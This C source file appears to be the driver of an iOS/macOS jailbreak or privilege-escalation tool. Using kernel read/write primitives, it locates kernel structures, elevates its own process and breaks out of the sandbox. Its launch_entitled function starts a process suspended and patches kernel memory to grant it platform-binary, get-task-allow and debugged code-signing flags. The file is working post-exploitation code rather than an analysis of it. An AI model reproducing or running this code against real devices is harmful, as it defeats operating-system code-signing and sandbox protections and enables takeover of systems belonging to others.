#include "main.h"
#include "cs_blobs.h"
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <spawn.h>
#include <signal.h>

/*
NOTE:
if returning in the future remember to fix find_allproc() + restore find_cmds() functionality
Temp changes are labelled: "FIX ME"
*/

#define FAST

int initialize()
{
    // I've formatted it like this to emphasise importance of order and interdependency, there won't be that many
    printf("\n[*] Loading library - ");
    toolbox = buy_toolbox();

    if (toolbox)
    {
        printf("\n[*] Parsing Mach-O header");
        toolbox->header = parse_macho(toolbox);

        if (toolbox->header)
        {
            printf("\n[*] Storing commands - ");

            toolbox->commands = find_cmds(toolbox);
            if (toolbox->commands)
            {
                printf("\n[*] Finding offsets - ");
                toolbox->offsets = find_offsets(toolbox);
            }
        }
    }

    printf("\n");
    return !(toolbox &&
             (toolbox->initialised = (toolbox && toolbox->header &&
                                      toolbox->commands && toolbox->offsets)));
}

int rk32(addr64_t pointer)
{
    uint32_t val = 0;
    if (toolbox->kread(pointer, &val, sizeof(uint32_t)))
    {
        printf("Failed to read");
        return 0;
    }

    return val;
}

int wk32(addr64_t pointer, uint32_t val)
{
    if (toolbox->kwrite(&val, pointer, sizeof(uint32_t)))
    {
        printf("Failed to write");
        return 1;
    }

    return 0;
}

int launch_entitled(char *path)
{
    posix_spawnattr_t attr;
    pid_t pid;
    int status;

    status = posix_spawnattr_init(&attr);
    if (status != 0)
    {
        perror("can't init spawnattr");
        exit(status);
    }

    status = posix_spawnattr_setflags(&attr, POSIX_SPAWN_START_SUSPENDED);
    if (status != 0)
    {
        perror("can't set flags");
        exit(status);
    }

    status = posix_spawn(&pid, path, NULL, &attr, NULL, NULL);
    if (status != 0)
    {
        printf("posix_spawn: %s\n", strerror(status));
        exit(status);
    }

    uint64_t target_proc = 0;
    if (!(target_proc = find_proc(toolbox, pid)))
    {
        printf("Failed to find proc");
        return 0;
    }

    uint64_t target_task = read_pointer(toolbox, target_proc + __task_offset);
    uint32_t target_flags = rk32(target_task + __flags_offset);
    wk32(target_task + __flags_offset, target_flags | TF_PLATFORM);

    uint32_t target_csflags = rk32(target_proc + __cs_flags_offset);
    target_csflags = target_csflags | CS_PLATFORM_BINARY | CS_GET_TASK_ALLOW | CS_DEBUGGED;
    wk32(target_proc + __cs_flags_offset, target_csflags);

    kill(pid, SIGCONT);

    wait(&status);
    printf("child exited with status %d\n", WEXITSTATUS(status));
    return 0;
}

int main(int argc, char **argv)
{
    printf("\n[*] UID: %d, PID: %d\n", getuid(), getpid());

    if (initialize())
    {
        printf("Failed setup :(\n");
        return 1;
    }

    printf("\n[*] Stealing the keys and breaking myself out - ");
    if (safe_elevate(toolbox, find_pid(toolbox, argv[0])) || test_rw())
        return 1;

    printf("%d", setsid());

    printf("\n%s",
           (read_pointer(read_pointer(toolbox, toolbox->offsets->my_task_port +
                                                   __ip_kobject_offset) +
                         __bsd_info) == toolbox->offsets->my_proc)
               ? "[*] task_port found"
               : "Huh? You got the wrong task_port my friend");

    // launch_entitled("/usr/bin/sinject");
    return 0;
}
